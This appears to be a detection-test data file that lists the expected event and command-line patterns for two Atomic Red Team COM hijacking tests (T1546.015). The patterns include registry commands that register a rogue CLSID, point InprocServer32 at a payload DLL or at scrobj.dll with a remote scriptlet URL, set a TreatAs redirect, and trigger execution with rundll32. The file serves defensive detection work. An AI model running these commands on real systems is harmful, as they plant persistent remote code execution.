T1546.015,windows,48117158,COM Hijacking - InprocServer32
_E_,ETW,event_data_list~=New-Item -Path 'HKCU:\SOFTWARE\Classes\CLSID\#{clsid}' -Value '#{clsid_description}'
_E_,ETW,event_data_list~=New-Item -Path 'HKCU:\SOFTWARE\Classes\CLSID\#{clsid}\InprocServer32' -Value
_E_,ETW,event_data_list~=atomics\..\ExternalPayloads\T1546.015_calc.dll
_E_,ETW,event_data_list~=New-ItemProperty -Path 'HKCU:\SOFTWARE\Classes\CLSID\#{clsid}\InprocServer32' -Name 'ThreadingModel' -Value '#{clsid_threading}' -PropertyType "String"
_E_,ETW,event_data_list~=Start-Process -FilePath "C:\Windows\System32\RUNDLL32.EXE" -ArgumentList '-localserver #{clsid}'

T1546.015,windows,33eacead,COM hijacking via TreatAs
_E_,Process,cmdline~=reg.exe add HKEY_CURRENT_USER\SOFTWARE\Classes\AtomicTest /ve /T REG_SZ /d AtomicTest /f
_E_,Process,cmdline~=reg.exe add HKEY_CURRENT_USER\SOFTWARE\Classes\AtomicTest.1.00 /ve /T REG_SZ /d AtomicTest /f
_E_,Process,cmdline~=reg.exe add HKEY_CURRENT_USER\SOFTWARE\Classes\AtomicTest\CLSID /ve /T REG_SZ /d {00000001-0000-0000-0000-0000FEEDACDC} /f
_E_,Process,cmdline~=reg.exe add HKEY_CURRENT_USER\SOFTWARE\Classes\AtomicTest.1.00\CLSID /ve /T REG_SZ /d {00000001-0000-0000-0000-0000FEEDACDC} /f
_E_,Process,cmdline~=reg.exe add HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC} /f
_E_,Process,cmdline~=reg.exe add HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC} /ve /T REG_SZ /d AtomicTest /f
_E_,Process,cmdline~=reg.exe add HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\InprocServer32 /ve /T REG_SZ /d C:\WINDOWS\system32\scrobj.dll /f
_E_,Process,cmdline~=reg.exe add HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\InprocServer32 /v ThreadingModel /T REG_SZ /d Apartment /f
_E_,Process,cmdline~=reg.exe add HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\ProgID /ve /T REG_SZ /d AtomicTest /f
_E_,Process,cmdline~=reg.exe add HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\ScriptletURL /ve /T REG_SZ /d https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1546.015/src/TreatAs.sct /f
_E_,Process,cmdline~=reg.exe add HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\VersionIndependentProgID /ve /T REG_SZ /d AtomicTest /f
_E_,Process,cmdline~=reg.exe add HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{97D47D56-3777-49FB-8E8F-90D7E30E1A1E} /f
_E_,Process,cmdline~=reg.exe add HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{97D47D56-3777-49FB-8E8F-90D7E30E1A1E}\TreatAs /ve /T REG_SZ /d {00000001-0000-0000-0000-0000FEEDACDC} /f
_E_,Process,cmdline~=rundll32.exe -sta AtomicTest


